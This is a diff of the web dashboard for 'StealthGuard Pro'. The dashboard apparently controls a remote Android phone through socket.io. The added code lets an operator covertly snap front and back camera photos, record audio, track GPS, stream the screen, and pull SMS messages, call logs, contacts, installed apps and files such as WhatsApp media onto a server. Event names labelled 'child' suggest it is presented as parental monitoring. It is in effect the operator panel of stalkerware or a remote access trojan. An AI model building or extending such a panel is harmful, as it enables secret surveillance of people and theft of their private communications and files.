@@ -6,129 +6,304 @@
     <title>StealthGuard Pro - Dashboard</title>
     <script src="/socket.io/socket.io.js"></script>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #4f46e5; --secondary: #1e293b; --accent: #10b981; --bg: #f8fafc; }
+        :root { --primary: #6366f1; --secondary: #1e293b; --accent: #10b981; --bg: #f8fafc; --danger: #ef4444; }
         body { background-color: var(--bg); font-family: 'Inter', sans-serif; color: #334155; }
-        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 2rem 1rem; position: fixed; width: 260px; }
+        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 260px; box-shadow: 4px 0 10px rgba(0,0,0,0.1); }
         .main-content { margin-left: 260px; padding: 2rem; }
-        .nav-link { color: #94a3b8; padding: 0.8rem 1.2rem; border-radius: 8px; margin-bottom: 0.5rem; display: flex; align-items: center; text-decoration: none; }
-        .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.1); color: white; }
-        .card { border: none; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); background: white; margin-bottom: 1.5rem; }
-        #log-container { height: 200px; overflow-y: auto; background: #0f172a; color: #38bdf8; padding: 1rem; font-family: monospace; font-size: 0.8rem; border-radius: 8px; }
-        .status-online { background: #10b981; width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
-        .status-offline { background: #ef4444; width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
-        #screen-canvas { width: 100%; max-width: 400px; border: 2px solid #ddd; border-radius: 10px; background: #000; }
-        .notif-item { padding: 10px; border-bottom: 1px solid #f1f5f9; }
-        .notif-app { font-weight: 600; color: var(--primary); font-size: 0.8rem; }
+        .nav-link { color: #94a3b8; padding: 12px 18px; border-radius: 10px; margin-bottom: 8px; display: flex; align-items: center; text-decoration: none; cursor: pointer; transition: 0.3s; }
+        .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.1); color: white; transform: translateX(5px); }
+        .nav-link i { width: 25px; }
+        .card { border: none; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); background: white; margin-bottom: 1.5rem; }
+        .status-badge { padding: 6px 12px; border-radius: 20px; font-weight: 600; font-size: 0.75rem; letter-spacing: 1px; }
+        .status-online { background: rgba(16,185,129,0.1); color: #10b981; border: 1px solid #10b981; }
+        .status-offline { background: rgba(239,68,68,0.1); color: #ef4444; border: 1px solid #ef4444; }
+        #screen-view { width: 100%; border-radius: 12px; background: #000; box-shadow: 0 20px 40px rgba(0,0,0,0.3); border: 4px solid #334155; }
+        .btn-action { border-radius: 10px; padding: 10px; font-weight: 500; transition: 0.2s; }
+        .btn-action:hover { filter: brightness(0.9); transform: scale(1.02); }
+        #log-container { height: 200px; overflow-y: auto; background: #0f172a; color: #38bdf8; padding: 1rem; font-family: 'Fira Code', monospace; font-size: 0.8rem; border-radius: 12px; border: 1px solid #334155; }
+        .data-table thead { background: #f1f5f9; }
+        .data-table th { font-weight: 600; color: #64748b; font-size: 0.8rem; }
+        .file-item { padding: 12px 16px; border-bottom: 1px solid #f1f5f9; cursor: pointer; display: flex; align-items: center; border-radius: 8px; margin: 2px 0; }
+        .file-item:hover { background: #f8fafc; color: var(--primary); }
+        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 1rem; }
+        .file-card { background: white; border: 1px solid #e2e8f0; border-radius: 12px; padding: 0.75rem; text-align: center; cursor: pointer; transition: 0.2s; position: relative; overflow: hidden; }
+        .file-card:hover { border-color: var(--primary); transform: translateY(-3px); box-shadow: 0 4px 12px rgba(99, 102, 241, 0.1); }
+        .file-thumb-container { width: 100%; height: 100px; border-radius: 8px; margin-bottom: 0.5rem; background: #f1f5f9; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .file-thumb-container img { width: 100%; height: 100%; object-fit: cover; }
+        .file-thumb-container i { font-size: 2.5rem; color: #cbd5e1; }
+        .file-name { font-size: 0.8rem; font-weight: 600; color: #334155; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 2px; }
+        .file-meta { font-size: 0.65rem; color: #94a3b8; }
+        .breadcrumb { background: #f8fafc; padding: 8px 16px; border-radius: 8px; margin-bottom: 1rem; font-size: 0.85rem; }
+        .breadcrumb-item + .breadcrumb-item::before { content: ">"; }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
-        <h4 class="mb-5 px-3 fw-bold"><i class="fas fa-shield-alt me-2"></i>StealthGuard</h4>
+        <div class="d-flex align-items-center mb-5 px-3">
+            <i class="fas fa-user-shield fa-2x text-primary me-2"></i>
+            <h4 class="mb-0 fw-bold">StealthGuard <span class="text-primary">Pro</span></h4>
+        </div>
         <nav>
-            <a href="#" class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-home me-3"></i> Dashboard</a>
-            <a href="#" class="nav-link" onclick="showTab('mirror')"><i class="fas fa-desktop me-3"></i> Screen Mirror</a>
-            <a href="#" class="nav-link" onclick="showTab('notifications')"><i class="fas fa-bell me-3"></i> Notifications</a>
-            <a href="#" class="nav-link" onclick="showTab('location')"><i class="fas fa-map-marker-alt me-3"></i> Location</a>
-            <a href="#" class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-open me-3"></i> Files</a>
+            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-home me-2"></i> Dashboard</a>
+            <a class="nav-link" onclick="showTab('mirror')"><i class="fas fa-desktop me-2"></i> Live Mirror</a>
+            <a class="nav-link" onclick="showTab('sms')"><i class="fas fa-sms me-2"></i> SMS Logs</a>
+            <a class="nav-link" onclick="showTab('calls')"><i class="fas fa-phone me-2"></i> Call Logs</a>
+            <a class="nav-link" onclick="showTab('contacts')"><i class="fas fa-address-book me-2"></i> Contacts</a>
+            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder me-2"></i> File Explorer</a>
+            <a class="nav-link" onclick="showTab('apps')"><i class="fas fa-th-large me-2"></i> Installed Apps</a>
         </nav>
-        <div class="mt-5 p-3 small text-white-50">
-            <span id="status-dot" class="status-offline"></span> <span id="status-text">Offline</span>
+        <div class="position-absolute bottom-0 start-0 w-100 p-4">
+            <div id="status-badge" class="status-badge status-offline text-center">OFFLINE</div>
         </div>
     </div>
 
     <div class="main-content">
-        <!-- Dashboard -->
         <div id="dashboard" class="tab-pane active">
-            <h2 class="fw-bold mb-4">Dashboard</h2>
-            <div class="row">
+            <h2 class="fw-bold mb-4">Quick Controls</h2>
+            <div class="row g-4 mb-4">
                 <div class="col-md-3">
-                    <div class="card p-3 text-center">
-                        <i class="fas fa-camera fa-2x text-success mb-2"></i>
-                        <h6>Camera</h6>
-                        <button class="btn btn-sm btn-primary" onclick="sendCommand('take_photo')">Snap Photo</button>
+                    <div class="card p-4 text-center">
+                        <i class="fas fa-camera fa-2x text-primary mb-3"></i>
+                        <h6>Front Photo</h6>
+                        <button class="btn btn-action btn-primary w-100" onclick="sendCommand('take_photo', {camera:'front'})">Capture</button>
                     </div>
                 </div>
                 <div class="col-md-3">
-                    <div class="card p-3 text-center">
-                        <i class="fas fa-microphone fa-2x text-danger mb-2"></i>
-                        <h6>Record</h6>
-                        <button class="btn btn-sm btn-outline-danger mb-1" onclick="sendCommand('start_record')">Start</button>
-                        <button class="btn btn-sm btn-danger" onclick="sendCommand('stop_record')">Stop</button>
+                    <div class="card p-4 text-center">
+                        <i class="fas fa-camera fa-2x text-secondary mb-3"></i>
+                        <h6>Back Photo</h6>
+                        <button class="btn btn-action btn-secondary w-100" onclick="sendCommand('take_photo', {camera:'back'})">Capture</button>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="card p-4 text-center">
+                        <i class="fas fa-microphone fa-2x text-danger mb-3"></i>
+                        <h6>Audio Rec</h6>
+                        <div class="btn-group w-100">
+                            <button class="btn btn-action btn-danger" onclick="sendCommand('start_record')">Start</button>
+                            <button class="btn btn-action btn-outline-danger" onclick="sendCommand('stop_record')">Stop</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="card p-4 text-center">
+                        <i class="fas fa-map-marker-alt fa-2x text-success mb-3"></i>
+                        <h6>GPS Tracker</h6>
+                        <button class="btn btn-action btn-success w-100" onclick="sendCommand('get_location')">Locate</button>
                     </div>
                 </div>
             </div>
-            <div class="card p-3">
-                <h6>Activity Logs</h6>
+            <div class="card p-4">
+                <h6 class="fw-bold text-secondary mb-3"><i class="fas fa-terminal me-2"></i>SYSTEM LIVE LOGS</h6>
                 <div id="log-container"></div>
             </div>
         </div>
 
-        <!-- Screen Mirror -->
         <div id="mirror" class="tab-pane d-none">
-            <h2 class="fw-bold mb-4">Live Screen Mirror</h2>
-            <div class="card p-4 text-center">
-                <img id="screen-view" src="" style="max-width: 100%; height: auto; border: 4px solid #333; border-radius: 15px; background: #000; display: none;">
-                <div id="mirror-placeholder" class="p-5 bg-light rounded-4">
-                    <i class="fas fa-tv fa-4x text-muted mb-3"></i>
-                    <p>Screen Mirroring not active</p>
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h2 class="fw-bold m-0">Live Screen Monitor</h2>
+                <div class="btn-group">
+                    <button class="btn btn-success px-4" onclick="sendCommand('start_mirror')"><i class="fas fa-play me-2"></i>START STREAM</button>
+                    <button class="btn btn-danger px-4" onclick="sendCommand('stop_mirror')"><i class="fas fa-stop me-2"></i>STOP</button>
                 </div>
-                <div class="mt-4">
-                    <button class="btn btn-success px-4" onclick="sendCommand('start_mirror')">Start Stream</button>
-                    <button class="btn btn-danger px-4" onclick="sendCommand('stop_mirror')">Stop Stream</button>
+            </div>
+            <div class="row justify-content-center">
+                <div class="col-lg-6">
+                    <img id="screen-view" src="" alt="Live Stream Container">
                 </div>
             </div>
         </div>
 
-        <!-- Notifications -->
-        <div id="notifications" class="tab-pane d-none">
-            <h2 class="fw-bold mb-4">Notification Logs</h2>
+        <div id="sms" class="tab-pane d-none">
+            <div class="d-flex justify-content-between mb-4"><h2>SMS Inbox</h2><button class="btn btn-primary" onclick="sendCommand('get_sms')">Refresh</button></div>
+            <div class="card overflow-hidden"><table class="table data-table mb-0"><thead><tr><th>Sender</th><th>Message Content</th><th>Timestamp</th></tr></thead><tbody id="sms-list"></tbody></table></div>
+        </div>
+
+        <div id="calls" class="tab-pane d-none">
+            <div class="d-flex justify-content-between mb-4"><h2>Call Records</h2><button class="btn btn-primary" onclick="sendCommand('get_calls')">Refresh</button></div>
+            <div class="card overflow-hidden"><table class="table data-table mb-0"><thead><tr><th>Number</th><th>Type</th><th>Duration</th></tr></thead><tbody id="calls-list"></tbody></table></div>
+        </div>
+
+        <div id="files" class="tab-pane d-none">
+            <h2 class="fw-bold mb-4">Cloud File Explorer</h2>
             <div class="card">
-                <div id="notif-list" style="max-height: 500px; overflow-y: auto;">
-                    <div class="p-5 text-center text-muted">Waiting for notifications...</div>
+                <div class="card-header bg-white p-3">
+                    <div id="breadcrumb-container" class="mb-3">
+                        <nav aria-label="breadcrumb">
+                            <ol class="breadcrumb mb-0" id="file-breadcrumbs"></ol>
+                        </nav>
+                    </div>
+                    <div class="d-flex gap-2">
+                        <button class="btn btn-outline-secondary" onclick="goBack()"><i class="fas fa-arrow-left"></i></button>
+                        <input type="text" id="path-input" class="form-control" value="/sdcard/">
+                        <button class="btn btn-primary px-4" onclick="loadFiles()">GO</button>
+                    </div>
                 </div>
+                <div id="file-list-container" style="max-height: 600px; overflow-y: auto;" class="p-3">
+                    <div id="file-grid" class="file-grid"></div>
+                </div>
+            </div>
+            <div class="mt-3">
+                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/DCIM/Camera')">Gallery</button>
+                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/WhatsApp/Media')">WhatsApp</button>
+                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/Download')">Downloads</button>
+                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/Pictures')">Pictures</button>
             </div>
         </div>
 
-        <!-- Other tabs (simplified for brevity) -->
-        <div id="location" class="tab-pane d-none"><h2>Location</h2><div id="loc-data" class="card p-3"></div></div>
-        <div id="files" class="tab-pane d-none"><h2>File Manager</h2><button class="btn btn-primary" onclick="sendCommand('list_files')">Load Files</button><div id="file-list" class="card mt-2"></div></div>
+        <div id="contacts" class="tab-pane d-none">
+            <div class="d-flex justify-content-between mb-4"><h2>Phonebook</h2><button class="btn btn-primary" onclick="sendCommand('get_contacts')">Refresh</button></div>
+            <div class="card overflow-hidden"><table class="table data-table mb-0"><thead><tr><th>Name</th><th>Phone Number</th></tr></thead><tbody id="contacts-list"></tbody></table></div>
+        </div>
+
+        <div id="apps" class="tab-pane d-none">
+            <div class="d-flex justify-content-between mb-4"><h2>Installed Applications</h2><button class="btn btn-primary" onclick="sendCommand('get_apps')">Refresh</button></div>
+            <div class="card"><ul class="list-group list-group-flush" id="apps-list"></ul></div>
+        </div>
+    </div>
+
+    <!-- Professional Popup for Photos -->
+    <div id="image-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+        <div class="text-center">
+            <h5 class="text-white mb-3" id="photo-title">REMOTE CAPTURE</h5>
+            <img id="modal-img" src="" style="max-width: 85vw; max-height: 80vh; border-radius: 12px; box-shadow: 0 0 50px rgba(0,0,0,0.5);">
+            <div class="mt-4">
+                <button class="btn btn-light px-5" onclick="closeImg()">CLOSE</button>
+                <a id="download-link" href="#" download="remote_img.jpg" class="btn btn-primary px-5">DOWNLOAD</a>
+            </div>
+        </div>
     </div>
 
     <script>
         const socket = io({ query: { type: 'web' } });
+        let currentPath = "/sdcard/";
 
         socket.on('device_status', (data) => {
-            document.getElementById('status-dot').className = data.connected ? "status-online" : "status-offline";
-            document.getElementById('status-text').innerText = data.connected ? "Online" : "Offline";
-            log("System: Device status updated.");
+            const badge = document.getElementById('status-badge');
+            badge.innerText = data.connected ? "ONLINE" : "OFFLINE";
+            badge.className = data.connected ? "status-badge status-online text-center" : "status-badge status-offline text-center";
+            log("System: Connection status updated.");
         });
 
-        socket.on('notification_data', (data) => {
-            const list = document.getElementById('notif-list');
-            if(list.innerText.includes('Waiting')) list.innerHTML = '';
-            const item = document.createElement('div');
-            item.className = 'notif-item';
-            item.innerHTML = `<div class="notif-app">${data.app}</div><div class="fw-bold">${data.title}</div><div>${data.content}</div>`;
-            list.prepend(item);
-            log(`Notif: ${data.title} from ${data.app}`);
+        socket.on('screen_frame', (data) => {
+            document.getElementById('screen-view').src = 'data:image/jpeg;base64,' + data.image;
         });
 
-        socket.on('screen_data', (base64) => {
-            const img = document.getElementById('screen-view');
-            const placeholder = document.getElementById('mirror-placeholder');
-            img.src = 'data:image/jpeg;base64,' + base64;
-            img.style.display = 'inline-block';
-            placeholder.style.display = 'none';
+        socket.on('child_photo_taken', (data) => {
+            const url = '/captured_photo.jpg?t=' + Date.now();
+            document.getElementById('modal-img').src = url;
+            document.getElementById('download-link').href = url;
+            document.getElementById('image-modal').classList.remove('d-none');
+            log("Camera: New photo received!");
         });
 
-        function sendCommand(action) {
-            socket.emit('gui_command', { action: action });
-            log("Sent: " + action);
+        socket.on('child_sms_list', (data) => {
+            const body = document.getElementById('sms-list'); body.innerHTML = '';
+            data.sms.forEach(s => { body.innerHTML += `<tr><td><span class="fw-bold">${s.address}</span></td><td>${s.body}</td><td class="text-muted small">${new Date(s.date).toLocaleString()}</td></tr>`; });
+        });
+
+        socket.on('child_call_logs', (data) => {
+            const body = document.getElementById('calls-list'); body.innerHTML = '';
+            data.calls.forEach(c => { body.innerHTML += `<tr><td>${c.number}</td><td><span class="badge ${c.type==1?'bg-success':'bg-primary'}">${c.type==1?'IN':'OUT'}</span></td><td>${c.duration}s</td></tr>`; });
+        });
+
+        socket.on('child_contacts', (data) => {
+            const body = document.getElementById('contacts-list'); body.innerHTML = '';
+            data.contacts.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c => { body.innerHTML += `<tr><td>${c.name}</td><td>${c.number}</td></tr>`; });
+        });
+
+        socket.on('child_apps', (data) => {
+            const body = document.getElementById('apps-list'); body.innerHTML = '';
+            data.apps.sort((a,b)=>a.name.localeCompare(b.name)).forEach(a => { body.innerHTML += `<li class="list-group-item d-flex justify-content-between align-items-center">${a.name} <span class="text-muted x-small">${a.package}</span></li>`; });
+        });
+
+        socket.on('child_location_update', (data) => {
+            log(`Location: Got GPS [${data.lat}, ${data.lng}]`);
+            window.open(`https://www.google.com/maps?q=${data.lat},${data.lng}`, '_blank');
+        });
+
+        socket.on('file_list', (data) => {
+            const grid = document.getElementById('file-grid');
+            grid.innerHTML = '';
+            currentPath = data.path;
+            document.getElementById('path-input').value = currentPath;
+
+            updateBreadcrumbs(currentPath);
+
+            data.files.sort((a,b)=>b.is_directory - a.is_directory).forEach(file => {
+                const card = document.createElement('div');
+                card.className = 'file-card';
+
+                let iconClass = 'fa-file-alt';
+                let colorClass = 'text-secondary';
+
+                if(file.is_directory) { iconClass = 'fa-folder'; colorClass = 'text-warning'; }
+                else if(file.name.match(/\.(jpg|jpeg|png|webp)$/i)) { iconClass = 'fa-image'; colorClass = 'text-info'; }
+                else if(file.name.match(/\.(mp4|mkv|3gp)$/i)) { iconClass = 'fa-video'; colorClass = 'text-danger'; }
+                else if(file.name.match(/\.(mp3|wav|ogg)$/i)) { iconClass = 'fa-music'; colorClass = 'text-success'; }
+
+                let thumbHtml = `<i class="fas ${iconClass} ${colorClass}"></i>`;
+                if(file.thumbnail) {
+                    thumbHtml = `<img src="data:image/jpeg;base64,${file.thumbnail}" alt="thumb">`;
+                }
+
+                card.innerHTML = `
+                    <div class="file-thumb-container">${thumbHtml}</div>
+                    <div class="file-name" title="${file.name}">${file.name}</div>
+                    <div class="file-meta">${file.is_directory ? 'Folder' : file.formatted_size}</div>
+                    <div class="file-meta">${file.last_modified}</div>
+                `;
+
+                card.onclick = () => {
+                    if(file.is_directory) browseFolder(file.path);
+                    else if(confirm(`Download ${file.name}?`)) sendCommand('get_file', {file_path: file.path});
+                };
+                grid.appendChild(card);
+            });
+        });
+
+        function updateBreadcrumbs(path) {
+            const bc = document.getElementById('file-breadcrumbs');
+            bc.innerHTML = '';
+            const parts = path.split('/').filter(p => p);
+
+            let fullPath = '';
+
+            // Add Root
+            const rootItem = document.createElement('li');
+            rootItem.className = 'breadcrumb-item';
+            rootItem.innerText = 'Root';
+            rootItem.onclick = () => browseFolder('/');
+            bc.appendChild(rootItem);
+
+            parts.forEach((part, index) => {
+                fullPath += '/' + part;
+                const li = document.createElement('li');
+                li.className = 'breadcrumb-item' + (index === parts.length - 1 ? ' active' : '');
+                li.innerText = part;
+                if(index < parts.length - 1) {
+                    const thisPath = fullPath;
+                    li.onclick = () => browseFolder(thisPath);
+                }
+                bc.appendChild(li);
+            });
         }
+
+        socket.on('download_ready', (data) => { alert(`File "${data.name}" downloaded to server!`); });
+
+        function sendCommand(action, params = {}) {
+            socket.emit('gui_command', { action: action, ...params });
+            log("ACTION: Sent command [" + action.toUpperCase() + "]");
+        }
+
+        function browseFolder(path) { sendCommand('list_files', {path: path}); }
+        function loadFiles() { browseFolder(document.getElementById('path-input').value); }
+        function goBack() { browseFolder(currentPath.substring(0, currentPath.lastIndexOf('/')) || "/sdcard/"); }
+        function closeImg() { document.getElementById('image-modal').classList.add('d-none'); }
 
         function showTab(id) {
             document.querySelectorAll('.tab-pane').forEach(el => el.classList.add('d-none'));
@@ -139,7 +314,7 @@
 
         function log(msg) {
             const container = document.getElementById('log-container');
-            container.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            container.innerHTML += `<div><span class="text-white-50">[${new Date().toLocaleTimeString()}]</span> ${msg}</div>`;
             container.scrollTop = container.scrollHeight;
         }
     </script>
